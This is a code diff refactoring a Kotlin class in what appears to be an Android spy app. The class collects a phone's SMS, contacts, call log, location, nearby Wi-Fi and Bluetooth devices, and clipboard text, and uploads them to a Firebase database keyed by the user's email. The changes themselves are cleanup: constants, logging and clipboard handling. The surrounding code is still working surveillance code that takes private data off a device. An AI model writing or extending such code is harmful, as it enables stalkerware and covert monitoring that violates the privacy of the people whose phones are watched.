@@ -17,11 +17,11 @@ import com.komnacki.androidspyapp.device.memory.MemoryState
 import com.komnacki.androidspyapp.device.network.NetworkState
 import com.komnacki.androidspyapp.device.nfc.NFCState
 import com.komnacki.androidspyapp.sms.SmsState
-import github.nisrulz.easydeviceinfo.base.EasyConfigMod
 import java.text.SimpleDateFormat
 import java.util.*
 
 class MessageUtils {
+    private val DATABASE_SEPARATOR = "/"
     private val BATTERY_DATABASE_TAG = "BATTERY"
     private val BLUETOOTH_DATABASE_TAG = "BLUETOOTH"
     private val CONFIG_DATABASE_TAG = "CONFIG"
@@ -34,11 +34,16 @@ class MessageUtils {
     private val CONTACTS_DATABASE_TAG = "CONTACTS"
     private val CALLLOG_DATABASE_TAG = "CALL_LOG"
     private val WIFI_LIST_DATABASE_TAG = "WIFI_LIST"
+    private val WIFI_LIST_DATABASE_TAG_EMPTY = "WIFI_LIST/Empty"
     private val BLUETOOTH_LIST_DATABASE_TAG = "BLUETOOTH_LIST"
+    private val BLUETOOTH_LIST_DATABASE_TAG_EMPTY = "BLUETOOTH_LIST/Empty"
     private val CLIPBOARD_DATABASE_TAG = "CLIPBOARD/VALUE"
 
+    private val dateFormat = "yyyy-MM-dd"
+    private val timeFormat = "HH:mm:ss"
+
     enum class StateChange {
-        NOT_CHANGE, CHANGE_TO_ENABLED
+        CHANGED, NOT_CHANGED
     }
 
     companion object {
@@ -52,12 +57,8 @@ class MessageUtils {
     }
 
     fun getBaseHeader(): DatabaseReference {
-        val easyConfigMode = EasyConfigMod(context)
-        val currDate = SimpleDateFormat("yyyy-MM-dd", Locale.getDefault()).format(Date())
-        val currTime = SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(Date())
-        Log.d("KK: ", "currDate: " + currDate)
-        Log.d("KK: ", "currTime: " + currTime)
-
+        val currDate = SimpleDateFormat(dateFormat, Locale.getDefault()).format(Date())
+        val currTime = SimpleDateFormat(timeFormat, Locale.getDefault()).format(Date())
 
         return FirebaseDatabase.getInstance().reference
             .child(userEmail)
@@ -85,110 +86,98 @@ class MessageUtils {
 
         val values = mutableMapOf<String, Any>()
 
-        Log.d("KK: ", "write battery")
         batteryState.getData().forEach { item ->
-            values[BATTERY_DATABASE_TAG + "/" + item.key] = item.value
+            values[BATTERY_DATABASE_TAG + DATABASE_SEPARATOR + item.key] = item.value
         }
-
-        Log.d("KK: ", "write bluetooth")
         bluetoothState.getData().forEach { item ->
-            values[BLUETOOTH_DATABASE_TAG + "/" + item.key] = item.value
+            values[BLUETOOTH_DATABASE_TAG + DATABASE_SEPARATOR + item.key] = item.value
         }
-        Log.d("KK: ", "write config")
         configState.getData().forEach { item ->
-            values[CONFIG_DATABASE_TAG + "/" + item.key] = item.value
+            values[CONFIG_DATABASE_TAG + DATABASE_SEPARATOR + item.key] = item.value
         }
-        Log.d("KK: ", "write network")
         networkState.getData().forEach { item ->
-            values[NETWORK_DATABASE_TAG + "/" + item.key] = item.value
+            values[NETWORK_DATABASE_TAG + DATABASE_SEPARATOR + item.key] = item.value
         }
-        Log.d("KK: ", "write memory")
         memoryState.getData().forEach { item ->
-            values[MEMORY_DATABASE_TAG + "/" + item.key] = item.value
+            values[MEMORY_DATABASE_TAG + DATABASE_SEPARATOR + item.key] = item.value
         }
-        Log.d("KK: ", "write device")
         deviceState.getData().forEach { item ->
-            values[DEVICE_DATABASE_TAG + "/" + item.key] = item.value
+            values[DEVICE_DATABASE_TAG + DATABASE_SEPARATOR + item.key] = item.value
         }
-        Log.d("KK: ", "write nfc")
         nfcState.getData().forEach { item ->
-            values[NFC_DATABASE_TAG + "/" + item.key] = item.value
+            values[NFC_DATABASE_TAG + DATABASE_SEPARATOR + item.key] = item.value
         }
-        Log.d("KK: ", "write location")
         locationState.getData().forEach { item ->
-            values[LOCATION_DATABASE_TAG + "/" + item.key] = item.value
+            values[LOCATION_DATABASE_TAG + DATABASE_SEPARATOR + item.key] = item.value
         }
-        Log.d("KK: ", "write sms")
         smsState.getData().forEach { item ->
-            values[SMS_DATABASE_TAG + "/" + item.key] = item.value
+            values[SMS_DATABASE_TAG + DATABASE_SEPARATOR + item.key] = item.value
         }
-        Log.d("KK: ", "write contacts")
         contactsState.getData().forEach { item ->
-            values[CONTACTS_DATABASE_TAG + "/" + item.key] = item.value
+            values[CONTACTS_DATABASE_TAG + DATABASE_SEPARATOR + item.key] = item.value
         }
-        Log.d("KK: ", "write callog")
         calllogState.getData().forEach { item ->
-            values[CALLLOG_DATABASE_TAG + "/" + item.key] = item.value
+            values[CALLLOG_DATABASE_TAG + DATABASE_SEPARATOR + item.key] = item.value
         }
 
 
-        Log.d("KK: ", "write wifi")
         if (!wifiScanResult.isNullOrEmpty()) {
-            Log.d("KK: ", "wifiScanResult is not empty")
             wifiScanResult.forEach { scan ->
-                Log.d("KK: ", "wifiScanResult for each: " + scan.getWifiName())
                 val wifiNetwork = scan.getData()
                 wifiNetwork.forEach { item ->
-                    values[WIFI_LIST_DATABASE_TAG + "/" + normalizeName(scan.getWifiName()) + "/" + normalizeName(item.key)] = item.value
+                    values[WIFI_LIST_DATABASE_TAG +
+                            DATABASE_SEPARATOR +
+                            normalizeName(scan.getWifiName()) +
+                            DATABASE_SEPARATOR +
+                            normalizeName(item.key)] = item.value
                 }
             }
         } else {
-            values["$WIFI_LIST_DATABASE_TAG/Empty"] = ""
+            values[WIFI_LIST_DATABASE_TAG_EMPTY] = ""
         }
 
-        if(!bluetoothScanResult.isNullOrEmpty()) {
+        if (!bluetoothScanResult.isNullOrEmpty()) {
             bluetoothScanResult.forEach { scan ->
                 val bluetoothNetwork = scan.getData()
                 bluetoothNetwork.forEach { item ->
-                    Log.d("KK: ", "bluetooth key: " + item.key +", " + item.value)
-                    values[BLUETOOTH_LIST_DATABASE_TAG + "/" + normalizeName(scan.getBluetoothName()) + "/" + normalizeName(item.key)] = item.value
+                    values[BLUETOOTH_LIST_DATABASE_TAG +
+                            DATABASE_SEPARATOR +
+                            normalizeName(scan.getBluetoothName()) +
+                            DATABASE_SEPARATOR +
+                            normalizeName(item.key)] = item.value
                 }
             }
         } else {
-            values["$BLUETOOTH_LIST_DATABASE_TAG/Empty"] = ""
+            values[BLUETOOTH_LIST_DATABASE_TAG_EMPTY] = ""
         }
         sendClipboardContent(values)
 
-        Log.d("KK: ", "updateChildren")
-        //todo: odblokuj do wysylania
         getBaseHeader().updateChildren(values)
             .addOnSuccessListener {
-                Log.d("KK: ", "-------------- ON SUCCESS ----------------------")}
+                Log.i("KK: ", "Data updated successful")
+            }
             .addOnFailureListener { exception ->
-                Log.d("KK: ", "-------------- ON FAILED ----------------------")
-                Log.e("KK: ", "error: " + exception.message) }
+                Log.e("KK: ", "Error: " + exception.message)
+            }
             .addOnCompleteListener {
-                Log.d("KK: ", "-------------- ON COMPLETE ----------------------")
+                Log.i("KK: ", "Data updated complete")
             }
     }
 
     private fun sendClipboardContent(values: MutableMap<String, Any>) {
         try {
-            Log.d("KK: ", "clipbloard start")
-            val mClipboardManager =
-                context.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
-            if (mClipboardManager.primaryClip != null) {
-                val item: ClipData.Item = mClipboardManager.primaryClip!!.getItemAt(0)
+            (context.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager).primaryClip?.let {
+                val item: ClipData.Item = it.getItemAt(0)
                 if (!item.text.toString().isBlank()) {
                     values[CLIPBOARD_DATABASE_TAG] = item.text.toString()
                 }
             }
         } catch (e: Exception) {
-            Log.e("KK: ERROR: ", e.message + ", " + e.cause)
+            Log.e("KK: ", "ERROR: ${e.message}, ${e.cause}")
         }
     }
 
-    fun normalizeName(name: String): String {
+    private fun normalizeName(name: String): String {
         return name
             .replace("/", " ")
             .replace("#", " ")
@@ -201,23 +190,5 @@ class MessageUtils {
             .replace("[", " ")
             .replace("]", " ")
             .replace(" ", "_")
-//            .replace("ą", "a")
-//            .replace("ę", "e")
-//            .replace("ó", "o")
-//            .replace("ś", "s")
-//            .replace("ł", "l")
-//            .replace("ż", "z")
-//            .replace("ź", "z")
-//            .replace("ć", "c")
-//            .replace("ń", "n")
-//            .replace("Ą", "A")
-//            .replace("Ę", "E")
-//            .replace("Ó", "O")
-//            .replace("Ś", "S")
-//            .replace("Ł", "L")
-//            .replace("Ż", "Z")
-//            .replace("Ź", "Z")
-//            .replace("Ć", "C")
-//            .replace("Ń", "N")
     }
 }
